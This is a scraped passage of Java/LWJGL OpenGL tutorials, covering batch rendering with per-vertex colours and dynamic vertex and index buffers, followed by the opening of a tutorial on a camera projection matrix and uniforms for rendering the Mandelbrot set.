clear the framebuffer GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0); //Draw our squares glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents(); } } private static String parseShaderFromFile(String filePath) { StringBuilder data = new StringBuilder(); String line = &quot;&quot;; try { BufferedReader reader = new BufferedReader(new InputStreamReader(Application.class.getResourceAsStream(filePath))); line = reader.readLine(); while( line != null ) { data.append(line); data.append(&#39;\\n&#39;); line = reader.readLine(); } } catch(Exception e) { throw new IllegalArgumentException(&quot;Unable to load shader from: &quot; + filePath, e); } return data.toString(); } public static void main(String[] args) { new Application().run(); }}Batch Rendering - ColorsLet’s start by coloring our quads differently. You may remember in my earlier tutorial I discussed how vertices can contain all kinds of vertex attributes, not just position. This is where we can make use of that. We can store the color of each vertex as an attribute within our vertices array and then tell the GPU the position, size, etc of this attribute. Here is what our new vertices array will be:float[] vertices = new float[] { // Quad 1 - Top Left (Black) -0.75f, 0.75f, 1.0f, 1.0f, 1.0f, -0.75f, 0.25f, 1.0f, 1.0f, 1.0f, -0.25f, 0.25f, 1.0f, 1.0f, 1.0f, -0.25f, 0.75f, 1.0f, 1.0f, 1.0f, // Quad 2 - Bottom Left (White) -0.75f, -0.25f, 0.0f, 0.0f, 0.0f, -0.75f, -0.75f, 0.0f, 0.0f, 0.0f, -0.25f, -0.75f, 0.0f, 0.0f, 0.0f, -0.25f, -0.25f, 0.0f, 0.0f, 0.0f, // Quad 3 - Bottom Right (Green) 0.25f, -0.25f, 0.0f, 1.0f, 0.0f, 0.25f, -0.75f, 0.0f, 1.0f, 0.0f, 0.75f, -0.75f, 0.0f, 1.0f, 0.0f, 0.75f, -0.25f, 0.0f, 1.0f, 0.0f, // Quad 4 - Top Right (Blue) 0.25f, 0.75f, 0.0f, 0.0f, 1.0f, 0.25f, 0.25f, 0.0f, 0.0f, 1.0f, 0.75f, 0.25f, 0.0f, 0.0f, 1.0f, 0.75f, 0.75f, 0.0f, 0.0f, 1.0f};Now the composition of each quad looks like this:The GPU still does not know that we have placed this data there and presumes every two floats is position data so we are going to need to change this in our VBO by adding a new vertex attribute pointer using glVertexAttribPointer:// Pass data to GPUint positionElementCount = 2;int colorElementCount = 3;int stride = (positionElementCount * Float.BYTES) + (colorElementCount * Float.BYTES);int vboID = GL30.glGenBuffers();GL30.glBindBuffer(GL30.GL_ARRAY_BUFFER, vboID);GL30.glBufferData(GL30.GL_ARRAY_BUFFER, vboBuffer, GL30.GL_STATIC_DRAW);GL30.glVertexAttribPointer(0, positionElementCount, GL_FLOAT, false, stride, 0);GL30.glVertexAttribPointer(1, colorElementCount, GL_FLOAT, false, stride, positionElementCount * Float.BYTES);GL30.glEnableVertexAttribArray(0);GL30.glEnableVertexAttribArray(1);There are only a few slight differences this time. Firstly, we need to provide a new value for the stride for both of our vertex attributes. The stride is simply how many bytes one vertex takes up so we calculate it above. Then finally the last parameter has been changed. This parameter is an offset into our vertices data, this offset being the beginning of that vertex attribute. Our color attribute begins two floats in from the start (after the first position attribute) so we set it to two floats worth of bytes.We can now go ahead and use this new color data within our shaders. First we take in the data inside of our vertex shader in the same way we did for the position data. Then we create a varying to pass the color data over to the fragment shader where we can actually apply it to our quad:#version 410 corelayout(location = 0) in vec2 position;layout(location = 1) in vec3 color;out vec3 v_Color;void main() { gl_Position = vec4(position, 0.0f, 1.0f); v_Color = color;}(Note the color data is 3 floats long so it is taken is as a vec3)Now we can go ahead and use this data in our fragment shader to color the quad using gl_FragColor:#version 410 corein vec3 v_Color;void main() { gl_FragColor = vec4(v_Color, 1.0f);}If everything is working correctly we should now be able to run our code and see the following output:As you can see we have now successfully batch rendered four separate quads with different colors for each. The final challenge we may run into is moving the quads independent of one another (ie, without using an MVP Matrix as this will move all of them together). For this we need some way in which to update our VBO while the programming is running.Dynamic VBOsAs mentioned a few times previously when we passed data into a Vertex Buffer Object we told it that this data would never change using GL_STATIC_DRAW. This meant we could never update the vertex positions to move around our quad. However, now that we have implemented Batch Rendering we know why it is necessary to be able to do exactly that. Therefore we can create a Dynamic VBO using GL_DYNAMIC_DRAW. To demonstrate this we are going to make a new quad get added to the screen while the program is running and also modify the position of one of the other quads.First let’s go ahead and make our VBO dynamic. Insead of passing data directly to glBufferData we can instead allocate the amount of memory we are going to use. Here we do that by allocating the size of our vboBuffer FloatBuffer in bytes:// Pass data to GPUint positionElementCount = 2;int colorElementCount = 3;int stride = (positionElementCount * Float.BYTES) + (colorElementCount * Float.BYTES);int vboID = GL30.glGenBuffers();GL30.glBindBuffer(GL30.GL_ARRAY_BUFFER, vboID);GL30.glBufferData(GL30.GL_ARRAY_BUFFER, vboBuffer.capacity() * Float.BYTES, GL30.GL_DYNAMIC_DRAW);GL30.glVertexAttribPointer(0, positionElementCount, GL_FLOAT, false, stride, 0);GL30.glVertexAttribPointer(1, colorElementCount, GL_FLOAT, false, stride, positionElementCount * Float.BYTES);GL30.glEnableVertexAttribArray(0);GL30.glEnableVertexAttribArray(1);To test if our buffer is now dynamic we are going to create a keybind to move the position of our top left quad upwards. First we will create an instance variable called aKey and then update it within the glfwSetKeyCallback:private boolean aKey = false;glfwSetKeyCallback(window, (window, key, scancode, action, mods) -&amp;gt; { if ( key == GLFW_KEY_ESCAPE &amp;amp;&amp;amp; action == GLFW_RELEASE ) { glfwSetWindowShouldClose(window, true); // We will detect this in the rendering loop } if ( key == GLFW_KEY_A &amp;amp;&amp;amp; action == GLFW_PRESS) { aKey = true; } if ( key == GLFW_KEY_A &amp;amp;&amp;amp; action == GLFW_RELEASE) { aKey = false; }});Now we can poll for this key press within our main rendering loop and update the top left quad’s position using a function called glBufferSubData. This function is commonly used with dynamic VBOs as it simply replaces the data in the buffer instead of recreating the buffer entirely like glBufferData would. (Note the indices in our vertices ArrayList for this quad’s y values are 1, 6, 11 and 16):while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer // If A Key is held down if(aKey) { vboBuffer.put(1, vboBuffer.get(1) + 0.02f); vboBuffer.put(6, vboBuffer.get(6) + 0.02f); vboBuffer.put(11, vboBuffer.get(11) + 0.02f); vboBuffer.put(16, vboBuffer.get(16) + 0.02f); } GL30.glBufferSubData(GL30.GL_ARRAY_BUFFER, 0, vboBuffer); GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0); //Draw our squares glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents();}That should be it, we can now go ahead and run our program and hold down the A key. If everything has worked correctly the quad should slide off the screen as we update its position every frame:Finally we can try adding a fifth quad using a timer to demonstrate increasing the size of our dynamic buffer on the fly. First let’s define our quad in a separate float array outside of our main render loop:float[] quad5 = new float[] { // Quad 5 - Middle (Orange) -0.25f, 0.25f, 1.0f, 0.65f, 0.0f, -0.25f, -0.25f, 1.0f, 0.65f, 0.0f, 0.25f, -0.25f, 1.0f, 0.65f, 0.0f, 0.25f, 0.25f, 1.0f, 0.65f, 0.0f };We are also going to need to add some indices for this quad to our original indices array:// Indicesint[] indices = new int[] { // Quad 1 0, 1, 2, 2, 3, 0, // Quad 2 4, 5, 6, 6, 7, 4, // Quad 3 8, 9, 10, 10, 11, 8, // Quad 4 12, 13, 14, 14, 15, 12, // Quad 5 16, 17, 18, 18, 19, 16};One final change we need to make before writing the code that displays the quad is increasing the allocated memory of our VBO on the GPU and our FloatBuffer:// VBO (Vertex Buffer Object)FloatBuffer vboBuffer = BufferUtils.createFloatBuffer(vertices.length + quad5.length);for(float vertex : vertices) { vboBuffer.put(vertex);}vboBuffer.flip();// Pass data to GPUint positionElementCount = 2;int colorElementCount = 3;int stride = (positionElementCount * Float.BYTES) + (colorElementCount * Float.BYTES);int vboID = GL30.glGenBuffers();GL30.glBindBuffer(GL30.GL_ARRAY_BUFFER, vboID);GL30.glBufferData(GL30.GL_ARRAY_BUFFER, (vboBuffer.capacity() * Float.BYTES) + (quad5.length * Float.BYTES), GL30.GL_DYNAMIC_DRAW);GL30.glVertexAttribPointer(0, positionElementCount, GL_FLOAT, false, stride, 0);GL30.glVertexAttribPointer(1, colorElementCount, GL_FLOAT, false, stride, positionElementCount * Float.BYTES);GL30.glEnableVertexAttribArray(0);GL30.glEnableVertexAttribArray(1);Here you can see I simply made use of quad5.length when creating the FloatBuffer as well as when creating the GL_ARRAY_BUFFER. Now we can finally add some code to our main render loop to add the square:int timer = 0;// Run the rendering loop until the user has attempted to close// the window or has pressed the ESCAPE key.while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer // If A Key is held down if(aKey) { vboBuffer.put(1, vboBuffer.get(1) + 0.02f); vboBuffer.put(6, vboBuffer.get(6) + 0.02f); vboBuffer.put(11, vboBuffer.get(11) + 0.02f); vboBuffer.put(16, vboBuffer.get(16) + 0.02f); } timer++; // After 200 frames if(timer == 200) { // Regenerate our vboBuffer with the new quad vboBuffer.clear(); for(float vertex : vertices) { vboBuffer.put(vertex); } for(float vertex : quad5) { vboBuffer.put(vertex); } vboBuffer.flip(); } GL30.glBufferSubData(GL30.GL_ARRAY_BUFFER, 0, vboBuffer); GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0); //Draw our squares glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents();}Here I use a timer to add the quad after 200 frames. Due to the way Java’s Buffers work we end up having to recreate our vboBuffer after the timer has completed, adding the new quad to it. If all is working correctly the quad will appear shortly after running the program:From all of this it might be apparent that for larger projects it would be best to abstract the idea of a quad and vertex into their own classes and generate the vboBuffer using these to make it much easier to create a quad and add it to the screen. But for now this way of doing things works for showing off the general concept of Batch Rendering and using Dynamic VBOs. Here is the entirety of the source code so far:Application.javaimport org.lwjgl.*;import org.lwjgl.glfw.*;import org.lwjgl.opengl.*;import org.lwjgl.system.*;import java.io.BufferedReader;import java.io.InputStreamReader;import java.nio.*;import java.util.ArrayList;import java.util.Collections;import static org.lwjgl.glfw.Callbacks.*;import static org.lwjgl.glfw.GLFW.*;import static org.lwjgl.opengl.GL11.*;import static org.lwjgl.system.MemoryStack.*;import static org.lwjgl.system.MemoryUtil.*;public class Application { // The window handle private long window; private static final int WINDOW_WIDTH = 960 / 2; private static final int WINDOW_HEIGHT = 960 / 2; private boolean aKey = false; public void run() { init(); loop(); // Free the window callbacks and destroy the window glfwFreeCallbacks(window); glfwDestroyWindow(window); // Terminate GLFW and free the error callback glfwTerminate(); glfwSetErrorCallback(null).free(); } private void init() { // Setup an error callback. The default implementation // will print the error message in System.err. GLFWErrorCallback.createPrint(System.err).set(); // Initialize GLFW. Most GLFW functions will not work before doing this. if ( !glfwInit() ) throw new IllegalStateException(&quot;Unable to initialize GLFW&quot;); // Configure GLFW glfwDefaultWindowHints(); // optional, the current window hints are already the default glfwWindowHint(GLFW_VISIBLE, GLFW_FALSE); // the window will stay hidden after creation glfwWindowHint(GLFW_RESIZABLE, GLFW_TRUE); // the window will be resizable // Create the window window = glfwCreateWindow(WINDOW_WIDTH, WINDOW_HEIGHT, &quot;Batch Rendering Tutorial&quot;, NULL, NULL); if ( window == NULL ) throw new RuntimeException(&quot;Failed to create the GLFW window&quot;); // Setup a key callback. It will be called every time a key is pressed, repeated or released. glfwSetKeyCallback(window, (window, key, scancode, action, mods) -&amp;gt; { if ( key == GLFW_KEY_ESCAPE &amp;amp;&amp;amp; action == GLFW_RELEASE ) { glfwSetWindowShouldClose(window, true); // We will detect this in the rendering loop } if ( key == GLFW_KEY_A &amp;amp;&amp;amp; action == GLFW_PRESS) { aKey = true; } if ( key == GLFW_KEY_A &amp;amp;&amp;amp; action == GLFW_RELEASE) { aKey = false; } }); // Get the thread stack and push a new frame try ( MemoryStack stack = stackPush() ) { IntBuffer pWidth = stack.mallocInt(1); // int* IntBuffer pHeight = stack.mallocInt(1); // int* // Get the window size passed to glfwCreateWindow glfwGetWindowSize(window, pWidth, pHeight); // Get the resolution of the primary monitor GLFWVidMode vidmode = glfwGetVideoMode(glfwGetPrimaryMonitor()); // Center the window glfwSetWindowPos( window, (vidmode.width() - pWidth.get(0)) / 2, (vidmode.height() - pHeight.get(0)) / 2 ); } // the stack frame is popped automatically // Make the OpenGL context current glfwMakeContextCurrent(window); // Enable v-sync glfwSwapInterval(1); // Make the window visible glfwShowWindow(window); } private void loop() { // This line is critical for LWJGL&#39;s interoperation with GLFW&#39;s // OpenGL context, or any context that is managed externally. // LWJGL detects the context that is current in the current thread, // creates the GLCapabilities instance and makes the OpenGL // bindings available for use. GL.createCapabilities(); // Set the clear color glClearColor(1.0f, 0.0f, 0.0f, 0.0f); float[] vertices = new float[] { // Quad 1 - Top Left (Black) -0.75f, 0.75f, 1.0f, 1.0f, 1.0f, -0.75f, 0.25f, 1.0f, 1.0f, 1.0f, -0.25f, 0.25f, 1.0f, 1.0f, 1.0f, -0.25f, 0.75f, 1.0f, 1.0f, 1.0f, // Quad 2 - Bottom Left (White) -0.75f, -0.25f, 0.0f, 0.0f, 0.0f, -0.75f, -0.75f, 0.0f, 0.0f, 0.0f, -0.25f, -0.75f, 0.0f, 0.0f, 0.0f, -0.25f, -0.25f, 0.0f, 0.0f, 0.0f, // Quad 3 - Bottom Right (Green) 0.25f, -0.25f, 0.0f, 1.0f, 0.0f, 0.25f, -0.75f, 0.0f, 1.0f, 0.0f, 0.75f, -0.75f, 0.0f, 1.0f, 0.0f, 0.75f, -0.25f, 0.0f, 1.0f, 0.0f, // Quad 4 - Top Right (Blue) 0.25f, 0.75f, 0.0f, 0.0f, 1.0f, 0.25f, 0.25f, 0.0f, 0.0f, 1.0f, 0.75f, 0.25f, 0.0f, 0.0f, 1.0f, 0.75f, 0.75f, 0.0f, 0.0f, 1.0f }; float[] quad5 = new float[] { // Quad 5 - Middle (Orange) -0.25f, 0.25f, 1.0f, 0.65f, 0.0f, -0.25f, -0.25f, 1.0f, 0.65f, 0.0f, 0.25f, -0.25f, 1.0f, 0.65f, 0.0f, 0.25f, 0.25f, 1.0f, 0.65f, 0.0f }; // VBO (Vertex Buffer Object) FloatBuffer vboBuffer = BufferUtils.createFloatBuffer(vertices.length + quad5.length); for(float vertex : vertices) { vboBuffer.put(vertex); } vboBuffer.flip(); // Pass data to GPU int positionElementCount = 2; int colorElementCount = 3; int stride = (positionElementCount * Float.BYTES) + (colorElementCount * Float.BYTES); int vboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ARRAY_BUFFER, vboID); GL30.glBufferData(GL30.GL_ARRAY_BUFFER, (vboBuffer.capacity() * Float.BYTES) + (quad5.length * Float.BYTES), GL30.GL_DYNAMIC_DRAW); GL30.glVertexAttribPointer(0, positionElementCount, GL_FLOAT, false, stride, 0); GL30.glVertexAttribPointer(1, colorElementCount, GL_FLOAT, false, stride, positionElementCount * Float.BYTES); GL30.glEnableVertexAttribArray(0); GL30.glEnableVertexAttribArray(1); // Indices int[] indices = new int[] { // Quad 1 0, 1, 2, 2, 3, 0, // Quad 2 4, 5, 6, 6, 7, 4, // Quad 3 8, 9, 10, 10, 11, 8, // Quad 4 12, 13, 14, 14, 15, 12, // Quad 5 16, 17, 18, 18, 19, 16 }; // IBO (Index Buffer Object) IntBuffer iboBuffer = BufferUtils.createIntBuffer(indices.length); for(int index : indices) { iboBuffer.put(index); } iboBuffer.flip(); // Pass data to GPU int iboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ELEMENT_ARRAY_BUFFER, iboID); GL30.glBufferData(GL30.GL_ELEMENT_ARRAY_BUFFER, iboBuffer, GL30.GL_STATIC_DRAW); // Shaders int programID = GL30.glCreateProgram(); int vertShaderObj = GL30.glCreateShader(GL30.GL_VERTEX_SHADER); int fragShaderObj = GL30.glCreateShader(GL30.GL_FRAGMENT_SHADER); String vertexShader = parseShaderFromFile(&quot;/shaders/vert.shader&quot;); GL30.glShaderSource(vertShaderObj, vertexShader); GL30.glCompileShader(vertShaderObj); String fragmentShader = parseShaderFromFile(&quot;/shaders/frag.shader&quot;); GL30.glShaderSource(fragShaderObj, fragmentShader); GL30.glCompileShader(fragShaderObj); GL30.glAttachShader(programID, vertShaderObj); GL30.glAttachShader(programID, fragShaderObj); GL30.glLinkProgram(programID); GL30.glValidateProgram(programID); GL30.glUseProgram(programID); int timer = 0; // Run the rendering loop until the user has attempted to close // the window or has pressed the ESCAPE key. while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer // If A Key is held down if(aKey) { vboBuffer.put(1, vboBuffer.get(1) + 0.02f); vboBuffer.put(6, vboBuffer.get(6) + 0.02f); vboBuffer.put(11, vboBuffer.get(11) + 0.02f); vboBuffer.put(16, vboBuffer.get(16) + 0.02f); } timer++; // After 200 frames if(timer == 200) { // Regenerate our vboBuffer with the new quad vboBuffer.clear(); for(float vertex : vertices) { vboBuffer.put(vertex); } for(float vertex : quad5) { vboBuffer.put(vertex); } vboBuffer.flip(); } GL30.glBufferSubData(GL30.GL_ARRAY_BUFFER, 0, vboBuffer); GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0); //Draw our squares glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents(); } } private static String parseShaderFromFile(String filePath) { StringBuilder data = new StringBuilder(); String line = &quot;&quot;; try { BufferedReader reader = new BufferedReader(new InputStreamReader(Application.class.getResourceAsStream(filePath))); line = reader.readLine(); while( line != null ) { data.append(line); data.append(&#39;\\n&#39;); line = reader.readLine(); } } catch(Exception e) { throw new IllegalArgumentException(&quot;Unable to load shader from: &quot; + filePath, e); } return data.toString(); } public static void main(String[] args) { new Application().run(); }}/shaders/vert.shader#version 410 corelayout(location = 0) in vec2 position;layout(location = 1) in vec3 color;out vec3 v_Color;void main() { gl_Position = vec4(position, 0.0f, 1.0f); v_Color = color;}/shaders/frag.shader#version 410 corein vec3 v_Color;void main() { gl_FragColor = vec4(v_Color, 1.0f);}Dynamic IBOsWhen we added the fifth quad you might have wondered how we could make our IBO dynamic as we simply hardcoded it up above. Doing so is the exact same as for the VBO, maybe even slighter simpler. Firstly we will make a loop using some simple maths to generate our indices for us:// Indicesint indicesPerQuad = 6;int quads = 5;int[] indices = new int[indicesPerQuad * quads];int offset = 0;for(int i = 0; i &amp;lt; indices.length; i += 6) { indices[i + 0] = 0 + offset; indices[i + 1] = 1 + offset; indices[i + 2] = 2 + offset; indices[i + 3] = 2 + offset; indices[i + 4] = 3 + offset; indices[i + 5] = 0 + offset; offset += 4;}// IBO (Index Buffer Object)IntBuffer iboBuffer = BufferUtils.createIntBuffer(indicesPerQuad * quads);for(int index : indices) { iboBuffer.put(index);}iboBuffer.flip();Then we make our IBO dynamic using GL_DYNAMIC_DRAW and allocate memory for our indices:// Pass data to GPUint iboID = GL30.glGenBuffers();GL30.glBindBuffer(GL30.GL_ELEMENT_ARRAY_BUFFER, iboID);GL30.glBufferData(GL30.GL_ELEMENT_ARRAY_BUFFER, iboBuffer.capacity() * Float.BYTES, GL30.GL_DYNAMIC_DRAW);Now in our main render loop, just like before we pass in our indices using glBufferSubData:int timer = 0;// Run the rendering loop until the user has attempted to close// the window or has pressed the ESCAPE key.while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer // If A Key is held down if(aKey) { vboBuffer.put(1, vboBuffer.get(1) + 0.02f); vboBuffer.put(6, vboBuffer.get(6) + 0.02f); vboBuffer.put(11, vboBuffer.get(11) + 0.02f); vboBuffer.put(16, vboBuffer.get(16) + 0.02f); } timer++; // After 200 frames if(timer == 200) { // Regenerate our vboBuffer with the new quad vboBuffer.clear(); for(float vertex : vertices) { vboBuffer.put(vertex); } for(float vertex : quad5) { vboBuffer.put(vertex); } vboBuffer.flip(); } GL30.glBufferSubData(GL30.GL_ARRAY_BUFFER, 0, vboBuffer); GL30.glBufferSubData(GL30.GL_ELEMENT_ARRAY_BUFFER, 0, iboBuffer); GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0); //Draw our squares glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents();}With that our program is complete! It will work the exact same as before except this time we could add more indices on the fly if necessary too, just like for our vertices.ConclusionThanks so much for reading this tutorial, I hoped it helped you out somewhat and if you could please leave some feedback in the comments I’d really appreciate it :DI recently completed a project using in which I used Batch Rendering and Dynamic VBOs and IBOs to visualize sorting algorithms. If you want to check that out to see how these techniques can be applied, and also abstracted, it can be found on my github here." }, { "title": "OpenGL Tutorial - Visualizing the Mandelbrot Set Fractal - Part 2 of 2", "url": "/posts/opengl-tutorial-visualizing-the-mandelbrot-set-part-2-of-2/", "categories": "Old", "tags": "opengl, lwjgl, fractal, tutorial", "date": "2020-05-31 13:00:00 +0100", "snippet": "This is part 2 of my tutorial series on Visualizing the Mandelbrot Set Fractal using OpenGL. This part will cover the creation of a camera for zooming in and out and moving around as well as the fragment shader responsible for generating the fractal. If you are interested in how to draw a square to the screen with shaders applied to it, check out part one. This part is going to continue from where we left off in part one (a simple square colored purple using shaders).The CameraMVP MatrixThe first thing to learn when it comes to creating our camera is the basics of what an MVP Matrix or Model View Projection Matrix is. When you have a 3D space or game and want to implement a camera you are going to need some way to convert what the camera sees to a 2D screen. This is where the MVP Matrix comes into play. Using some matrix multiplication and tricks one can easily convert rendered scenes into 2D screen space. An MVP Matrix is actually made up of three matrices multiplied together. Model * View * Projection. In this tutorial we are going to only be dealing with the Projection Matrix of the MVP Matrix as that is all that we need. If you do wish to research further (such as for a 3D project) here is a great tutorial on the topic.The Projection Matrix is the last part in the process of converting a 3D object to 2D screen space coordinates. However, because all we have is simply a 2D scene we don’t need to deal with converting our object to 2D coordinates as it already is. Therefore we can simply use the Projection Matrix to “move” our object around. In reality, what we are really doing is moving our camera that looks at our object around. We are not modifying any of the vertex position attributes of our square. We can also make the object appear closer or further away from the screen by scaling our cameras view. With that all in mind lets begin creating our Projection Matrix.You may remember back at the start of part 1 we added the JOML addon to our LWJGL configuration. This addon is a great Java math library designed specifically for OpenGL which will provide us with many classes and functions for handling matrices and matrix math. In fact, it even provides some handy functions for generating our projection matrix for us:// Projection Matrixprivate Matrix4f pmatrix = new Matrix4f().ortho(-2.0f, 2.0f, -2.0f, 2.0f, -1.0f, 1.0f);Much of this code is based off of JOML’s README. The first thing we do is create a new 4*4 square matrix filled with floats. This is going to be our projection matrix. We then apply an orthographic projection to it using ortho(). The parameters for this are going to be our camera views bounds. The first -2.0f and 2.0f correspond to the horizontal coordinates of our screen. If you remember from part one the default OpenGL coordinates range from -1.0f to 1.0f. In our case this change is simply making it range from -2.0f to 2.0f. The next -2.0f and 2.0f correspond to the same thing except vertically. Finally the -1.0f, 1.0f is for the z-direction. This doesn’t necessarily matter to us as we aren’t going to be moving anything in that direction so I simply set it to the OpenGL default. Note that I am declaring this as an instance variable at the top of our program as it is going to need to be accessible by all areas of our program so that we can modify it using user input.Before that, however, we should first try applying it to our square. But how do we do that? What we want to do is multiply this matrix by our gl_Position in our fragment shader. Therefore we need some way to pass this matrix into our shader. The passing of information from the CPU to shaders is done via something called uniforms.UniformsTo create a uniform on the cpu side we are going to need to two simple OpenGL functions:// Cameratry (MemoryStack stack = MemoryStack.stackPush()) { FloatBuffer projection = pmatrix.get(stack.mallocFloat(4 * 4)); int mat4location = GL30.glGetUniformLocation(programID, &quot;u_MVP&quot;); GL30.glUniformMatrix4fv(mat4location, false, projection);}Note that this example uses correct LWJGL memory management practices as mentioned on the JOML README by first placing our matrix in a FloatBuffer before passing it as the data for our uniform. If you wish to read the documentation for a Matrix4f it can be found here.The first of these OpenGL functions is glGetUniformLocation. This takes in the shader’s program ID which already exists in our program as well what you wish to call this uniform’s variable. In my case I like to use the convention of “u_Something” when naming uniforms. This function then returns us an Integer which we can use to reference this uniform later on. Next we use glUniformMatrix4fv and pass it this Integer. This tells OpenGL we want this uniform to be a 4*4 square matrix of floats. After that we pass it false so that it does not transpose the matrix (this can be necessary as other graphics apis like DirectX use different matrix ordering in memory) and finally we pass in our FloatBuffer which contains our projection matrix. This code should be placed in the main loop of the program, as we will want to be able to update the matrix to move the camera around every frame. If you want to learn more about any of these OpenGL functions, just like in part one, I highly recommend checking out docs.gl.Finally we are going to head on over to our Vertex Shader called vert.shader and add in a small bit of extra code to make use of this projection matrix:layout(location = 0) in vec2 position;uniform mat4 u_MVP;void main() { gl_Position = u_MVP * vec4(position, 0, 1.0);}As you can see, at the top we take in the uniform using its variable name we chose above and then multiply it by the position of each of our vertices before passing them to gl_Positon.If we now go ahead and run our program it should produce the following window:As you can see, we have now changed the window’s scale from its original -1.0f to 1.0f to -2.0f to 2.0f. However, we have left the coordinates of our squares vertices the same and so now it only takes up a quarter of the screen in the center. The reasoning for making our screen coordinates range from -2.0f to 2.0f on both axises will become apparent once we start discussing the Mandelbrot Set calculations.Here is how our Application.java should look now:import org.joml.Matrix4f;import org.lwjgl.*;import org.lwjgl.glfw.*;import org.lwjgl.opengl.*;import org.lwjgl.system.*;import java.io.BufferedReader;import java.io.InputStreamReader;import java.nio.*;import static org.lwjgl.glfw.Callbacks.*;import static org.lwjgl.glfw.GLFW.*;import static org.lwjgl.opengl.GL11.*;import static org.lwjgl.system.MemoryStack.*;import static org.lwjgl.system.MemoryUtil.*;public class Application { // The window handle private long window; // Projection Matrix private Matrix4f pmatrix = new Matrix4f().ortho(-2.0f, 2.0f, -2.0f, 2.0f, -1.0f, 1.0f); public void run() { System.out.println(&quot;Hello LWJGL &quot; + Version.getVersion() + &quot;!&quot;); init(); loop(); // Free the window callbacks and destroy the window glfwFreeCallbacks(window); glfwDestroyWindow(window); // Terminate GLFW and free the error callback glfwTerminate(); glfwSetErrorCallback(null).free(); } private void init() { // Setup an error callback. The default implementation // will print the error message in System.err. GLFWErrorCallback.createPrint(System.err).set(); // Initialize GLFW. Most GLFW functions will not work before doing this. if ( !glfwInit() ) throw new IllegalStateException(&quot;Unable to initialize GLFW&quot;); // Configure GLFW glfwDefaultWindowHints(); // optional, the current window hints are already the default glfwWindowHint(GLFW_VISIBLE, GLFW_FALSE); // the window will stay hidden after creation glfwWindowHint(GLFW_RESIZABLE, GLFW_TRUE); // the window will be resizable // Create the window window = glfwCreateWindow(960 / 2, 960 / 2, &quot;Hello World!&quot;, NULL, NULL); if ( window == NULL ) throw new RuntimeException(&quot;Failed to create the GLFW window&quot;); // Setup a key callback. It will be called every time a key is pressed, repeated or released. glfwSetKeyCallback(window, (window, key, scancode, action, mods) -&amp;gt; { if ( key == GLFW_KEY_ESCAPE &amp;amp;&amp;amp; action == GLFW_RELEASE ) glfwSetWindowShouldClose(window, true); // We will detect this in the rendering loop }); // Get the thread stack and push a new frame try ( MemoryStack stack = stackPush() ) { IntBuffer pWidth = stack.mallocInt(1); // int* IntBuffer pHeight = stack.mallocInt(1); // int* // Get the window size passed to glfwCreateWindow glfwGetWindowSize(window, pWidth, pHeight); // Get the resolution of the primary monitor GLFWVidMode vidmode = glfwGetVideoMode(glfwGetPrimaryMonitor()); // Center the window glfwSetWindowPos( window, (vidmode.width() - pWidth.get(0)) / 2, (vidmode.height() - pHeight.get(0)) / 2 ); } // the stack frame is popped automatically // Make the OpenGL context current glfwMakeContextCurrent(window); // Enable v-sync glfwSwapInterval(1); // Make the window visible glfwShowWindow(window); } private void loop() { // This line is critical for LWJGL&#39;s interoperation with GLFW&#39;s // OpenGL context, or any context that is managed externally. // LWJGL detects the context that is current in the current thread, // creates the GLCapabilities instance and makes the OpenGL // bindings available for use. GL.createCapabilities(); // Set the clear color glClearColor(1.0f, 0.0f, 0.0f, 0.0f); // Vertices - Positions float[] vertices = new float[] { -1.0f, 1.0f, // Vertex 0 -1.0f, -1.0f, // Vertex 1 1.0f, -1.0f, // Vertex 2 1.0f, 1.0f // Vertex 3 }; // VBO (Vertex Buffer Object) FloatBuffer vboBuffer = BufferUtils.createFloatBuffer(vertices.length); for(float vertex : vertices) { vboBuffer.put(vertex); } vboBuffer.flip(); // Pass data to GPU int positionElementCount = vertices.length / 4; int vboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ARRAY_BUFFER, vboID); GL30.glBufferData(GL30.GL_ARRAY_BUFFER, vboBuffer, GL30.GL_STATIC_DRAW); GL30.glVertexAttribPointer(0, positionElementCount, GL_FLOAT, false, positionElementCount * Float.BYTES, 0); GL30.glEnableVertexAttribArray(0); // Indices int[] indices = new int[] { 0, 1, 2, 2, 3, 0 }; // IBO (Index Buffer Object) IntBuffer iboBuffer = BufferUtils.createIntBuffer(indices.length); for(int index : indices) { iboBuffer.put(index); } iboBuffer.flip(); // Pass data to GPU int iboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ELEMENT_ARRAY_BUFFER, iboID); GL30.glBufferData(GL30.GL_ELEMENT_ARRAY_BUFFER, iboBuffer, GL30.GL_STATIC_DRAW); // Shaders int programID = GL30.glCreateProgram(); int vertShaderObj = GL30.glCreateShader(GL30.GL_VERTEX_SHADER); int fragShaderObj = GL30.glCreateShader(GL30.GL_FRAGMENT_SHADER); String vertexShader = parseShaderFromFile(&quot;/shaders/vert.shader&quot;); GL30.glShaderSource(vertShaderObj, vertexShader); GL30.glCompileShader(vertShaderObj); String fragmentShader = parseShaderFromFile(&quot;/shaders/frag.shader&quot;); GL30.glShaderSource(fragShaderObj, fragmentShader); 